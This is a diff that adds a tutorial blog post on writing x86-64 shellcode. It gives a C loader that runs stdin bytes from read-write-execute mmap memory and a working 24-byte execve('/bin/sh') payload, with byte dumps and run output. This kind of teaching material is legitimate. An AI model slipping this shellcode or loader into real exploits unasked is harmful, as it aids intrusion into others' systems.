@@ -1,0 +1,176 @@
+---
+title: "How to Write Simple Shellcode"
+description: "Writing a C program that reads shellcode from stdin and executes it with mmap, then building minimal x86-64 Assembly shellcode that prints a string and spawns a shell via execve."
+pubDatetime: 2025-04-06
+tags:
+    - shellcode
+    - C
+    - Assembler
+    - syscall
+    - objdump
+    - xxd
+    - mmap
+---
+
+import CodeFile from "@/custom/CodeFile.astro";
+
+## How to Write Simple Shellcode
+
+Goal:
+* Write a program in `assembler` that launches a shell.
+* Write a program in `C` that reads the `shellcode` from the input stream and executes it.
+
+## Program to Execute Shellcode
+
+Using `mmap`, we allocate an executable memory region for the code:
+```c
+void *exec_mem = mmap(NULL, code_size,
+                      PROT_READ | PROT_WRITE | PROT_EXEC,
+                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+if (exec_mem == MAP_FAILED) {
+    perror("mmap");
+    return 1;
+}
+```
+
+We cast the memory pointer to a function pointer and call it.
+At the moment of the function call, control is passed to the shellcode.
+```c
+int (*func)() = (int (*)())exec_mem;
+    func();
+```
+
+Nothing complicated here. The key part is understanding mmap and its arguments.
+
+Full code:
+
+<CodeFile file="main.c" />
+
+## Writing the Assembler Program
+
+First, we'll write a basic program that simply prints the string hello to the screen.
+The goal is to ensure the shellcode:
+* runs.
+* performs its logic—in this case, printing a string.
+* returns control to the calling program.
+* does not break the program.
+
+The program consists of:
+* prologue.
+* pushing data onto the stack.
+* making the write syscall.
+* setting return code to zero.
+* epilogue.
+
+Code:
+
+<CodeFile file="shellcode1.asm" />
+
+## Running the Assembler Program
+
+Build it:
+```sh
+nasm -f elf64 -o shellcode.o shellcode.asm
+gcc -Wall -Wextra ./main.c -o app
+```
+
+Let's inspect the compiled assembler code:
+```sh
+root@47f7f8988dc6:/shellcode# objdump -d shellcode.o | tail -n +8
+   0:	55                   	push   %rbp
+   1:	48 89 e5             	mov    %rsp,%rbp
+   4:	5d                   	pop    %rbp
+   5:	48 b8 68 65 6c 6c 6f 	movabs $0xa6f6c6c6568,%rax
+   c:	0a 00 00
+   f:	50                   	push   %rax
+  10:	b8 01 00 00 00       	mov    $0x1,%eax
+  15:	bf 01 00 00 00       	mov    $0x1,%edi
+  1a:	48 89 e6             	mov    %rsp,%rsi
+  1d:	ba 06 00 00 00       	mov    $0x6,%edx
+  22:	0f 05                	syscall
+  24:	b8 00 00 00 00       	mov    $0x0,%eax
+  29:	48 89 ec             	mov    %rbp,%rsp
+  2c:	5d                   	pop    %rbp
+  2d:	c3                   	ret
+```
+
+We only need the disassembled machine code as a byte sequence.
+To minimize manual steps, we’ll use the `xxd` utility to convert `objdump` output to a byte array.
+Let's verify all bytes are present and there’s no extra data:
+```sh
+root@47f7f8988dc6:/shellcode# objdump -d shellcode.o --no-addresses --disassemble=fun1 | tail -n +8 | xxd -p -r | xxd
+00000000: 5548 89e5 5d48 b868 656c 6c6f 0a00 0050  UH..]H.hello...P
+00000010: b801 0000 00bf 0100 0000 4889 e6ba 0600  ..........H.....
+00000020: 0000 0f05 b800 0000 0048 89ec 5dc3       .........H..].
+```
+
+Run the application and pass the shellcode to stdin:
+```sh
+root@47f7f8988dc6:/shellcode# (objdump -d shellcode.o --no-addresses --disassemble=fun1 | tail -n +8 | xxd -p -r) | ./app
+Input shellcode (max 1024 bytes):
+Code dump (46 bytes):
+55 48 89 e5 5d 48 b8 68 65 6c 6c 6f 0a 00 00 50
+b8 01 00 00 00 bf 01 00 00 00 48 89 e6 ba 06 00
+00 00 0f 05 b8 00 00 00 00 48 89 ec 5d c3
+hello
+```
+
+We see hello printed to the screen, so everything is working correctly.
+In case of errors in the assembly code, you'll usually get a Segmentation fault.
+
+## Shellcode
+
+Now we want to launch a shell from assembly code.
+We'll use the execve syscall.
+We must provide the full path to the shell, e.g., /bin/sh.
+
+As before, we’ll place the string on the stack.
+We'll omit the prologue, epilogue, and return code setup since they’re not needed.
+
+Resulting code:
+
+<CodeFile file="shellcode2.asm" />
+
+Verify it compiles:
+```sh
+root@47f7f8988dc6:/shellcode# objdump -d shellcode.o --no-addresses --disassemble=fun2 | tail -n +8
+	48 bf 2f 62 69 6e 2f 	movabs $0x68732f6e69622f,%rdi
+	73 68 00
+	57                   	push   %rdi
+	b0 3b                	mov    $0x3b,%al
+	48 89 e7             	mov    %rsp,%rdi
+	48 31 f6             	xor    %rsi,%rsi
+	48 31 d2             	xor    %rdx,%rdx
+	0f 05                	syscall
+```
+
+Verify the machine instructions:
+```sh
+root@47f7f8988dc6:/shellcode# objdump -d shellcode.o --no-addresses --disassemble=fun2 | tail -n +8 | xxd -p -r | xxd
+00000000: 48bf 2f62 696e 2f73 6800 57b0 3b48 89e7  H./bin/sh.W.;H..
+00000010: 4831 f648 31d2 0f05                      H1.H1...
+```
+
+Check if the shell launches.
+Run `tty; ps -p $$` to ensure a new `shell` session starts:
+```sh
+root@47f7f8988dc6:/shellcode# tty; ps -p $$
+/dev/pts/0
+    PID TTY          TIME CMD
+      1 pts/0    00:00:02 bash
+
+root@47f7f8988dc6:/shellcode# (objdump -d shellcode.o --no-addresses --disassemble=fun2 | tail -n +8 | xxd -p -r; sleep 1; echo 'ps -p $$'; sleep 1) | ./app
+Input shellcode (max 1024 bytes):
+Code dump (24 bytes):
+48 bf 2f 62 69 6e 2f 73 68 00 57 b0 3b 48 89 e7
+48 31 f6 48 31 d2 0f 05
+not a tty
+    PID TTY          TIME CMD
+  10729 pts/0    00:00:00 sh
+```
+
+Great! The shellcode works as intended.
+It’s very compact—only 24 bytes. The code can be easily tweaked depending on the environment.
+
+## Useful Links
+* [x64.syscall.sh](https://x64.syscall.sh/)
